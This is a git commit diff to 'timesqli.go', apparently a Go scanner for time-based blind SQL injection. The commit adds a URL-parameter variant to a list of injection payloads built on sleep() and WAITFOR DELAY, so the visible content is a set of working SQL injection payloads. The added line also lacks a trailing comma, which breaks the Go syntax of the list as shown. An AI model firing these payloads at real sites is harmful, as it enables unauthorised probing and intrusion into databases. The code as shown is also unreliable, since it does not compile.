f686e3ffd7c92cefdf7223f165dac93fb3401f5f
Erick Fernando <erickfernandoxavier@hotmail.com>
2024-02-29 15:01:23 -0300

    Update timesqli.go

--- timesqli.go
+++ timesqli.go
@@ -108,7 +108,8 @@ func main() {
 
 	payloads := []string{
 		"if(now()=sysdate()%2Csleep(tempoSQLi)%2C0)",	
-		"1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",		
+		"1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z",
+		"?id=1'XOR(if(now()=sysdate()%2Csleep(tempoSQLi)%2C0))XOR'Z"
 		"1'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
 		"';WAITFOR DELAY '0:0:tempoSQLi'--"
 	}
